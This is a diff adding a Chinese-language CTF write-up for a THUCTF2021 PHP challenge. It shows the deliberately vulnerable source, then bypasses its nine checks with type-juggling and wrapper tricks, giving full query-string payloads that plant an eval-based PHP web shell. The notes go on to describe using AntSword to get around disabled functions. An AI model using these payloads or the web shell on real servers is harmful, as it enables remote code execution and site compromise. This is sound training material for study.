@@ -6940,7 +6940,114 @@ for i in range(1, 70):
     print(f"[result] {result}")
 ```
 
+## DataCon showmetrick
 
+
+
+```PHP
+<?php
+error_reporting(0);
+highlight_file(__FILE__);
+
+$var1 = $_GET['var1'] ?: '';
+$var2 = $_GET['var2'] ?: '';
+$var3 = $_GET['var3'] ?: '';
+$var4 = $_GET['var4'] ?: '';
+$var5 = $_GET['var5'] ?: '';
+$var6 = $_GET['var6'] ?: '';
+$var7 = $_GET['var7'] ?: '';
+$var8 = $_GET['var8'] ?: '';
+$var9 = $_GET['var9'] ?: '';
+
+if ($var1 != $var2 && sha1($var1) === sha1($var2)) {
+    if (!is_numeric($var3) && in_array($var3, array(1))) {
+        if (file_get_contents($var4) === "Welcome to THUCTF2021!") {
+            if (isset($_GET['thuctf_is.fun'])) {
+                if ($var5 != 2333 && intval($var5, 0) === 2333) {
+                    $t = is_numeric($var6) and is_numeric($var7) !== "THUCTF2021";
+                    if ($t && $var7 === "THUCTF2021") {
+                        if (!stristr($var8, "..") && !preg_match("/<\?|eval|system|assert|call|preg|create|sort|exec|php/i", $var9)) {
+                            file_put_contents("uploads/$var8", $var9);
+                        } else {
+                            die("level 7 fail!");
+                        }
+                    } else {
+                        die("level 6 fail!");
+                    }
+                } else {
+                    die("level 5 fail!");
+                }
+            } else {
+                die("level 4 fail!");
+            }
+        } else {
+            die("level 3 fail!");
+        }
+    } else {
+        die("level 2 fail!");
+    }
+} else {
+    die("level 1 fail!");
+}
+payload:
+var1[]=1&var2[]=2&var3=1a&var4=data://text/plain,Welcome%20to%20THUCTF2021!&thuctf[is.fun=1&var5=04435&var6=1&var7=THUCTF2021&var8=123.php&var9[]=<?php eval($_POST['cmd']);?>
+```
+
+第一关：sha1 弱类型比较，直接数组绕过
+
+第二关：PHP 弱类型，var3=1a 即可
+
+第三关：PHP 伪协议，输入流 data://
+
+第四关：PHP 传参特性，在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，得 thuctf[is.fun
+
+第五关：intval() 函数，基于下面这点，直接使用8进制绕过，得：var5=04435
+
+```PHP
+Note:
+如果 base 是 0，通过检测 var 的格式来决定使用的进制：
+如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)；否则，
+如果字符串以 "0" 开始，使用 8 进制(octal)；否则，
+将使用 10 进制 (decimal)。
+```
+
+第六关：`$t = is_numeric($var6) and is_numeric($var7) !== "THUCTF2021";`，=优先级大于and，后半部分直接可以不用管
+
+第七关：基于上面那关，直接得 var7 = "THUCTF2021"
+
+第八关：var8 不要有 .. 就行
+
+第九关：这里一开始想的是想从一句话木马入手，但是`<?`几乎限制了所有的PHP标签了，后面查了一下，`preg_match`在遇到对象的时候就返回False，所以这里直接传一个数组进去就好，后面的正则就可以直接不看了
+
+这里本来以为结束了，但是直接调用系统命令发现没有结果，看了一下phpinfo()发现几乎屏蔽了所有的能调用系统命令的函数
+
+```php
+payload:
+var1[]=1&var2[]=2&var3=1a&var4=data://text/plain,Welcome%20to%20THUCTF2021!&thuctf[is.fun=1&var5=04435&var6=1&var7=THUCTF2021&var8=123.php&var9[]=<?php phpinfo();?>
+```
+
+![img](CTF.assets/171346451401016.png)
+
+想了一下，换了一个思路，不执行系统命令，直接用PHP读文件，用scandir()扫一下目录，在/发现flag
+
+![img](CTF.assets/171346451401017.png)
+
+直接show_source读没读出来，再看有个readflag，那又回到原点，还是要执行系统命令，再认真看了一下disable_function，发现并没有过滤eval函数，那就直接挂马上蚁剑
+
+```PHP
+payload:
+var1[]=1&var2[]=2&var3=1a&var4=data://text/plain,Welcome%20to%20THUCTF2021!&thuctf[is.fun=1&var5=04435&var6=1&var7=THUCTF2021&var8=123.php&var9[]=<?php eval($_POST['cmd']);?>
+```
+
+![img](CTF.assets/171346451401018.png)
+
+使用蚁剑插件绕过php的disable_function执行命令即可
+
+![img](CTF.assets/171346451401119.png)
+
+关于蚁剑的插件安装直接去插件市场安装就行，但是需要挂代理，不然加载不出来
+
+![image-20240419022344159](CTF.assets/image-20240419022344159.png)
 
 
 
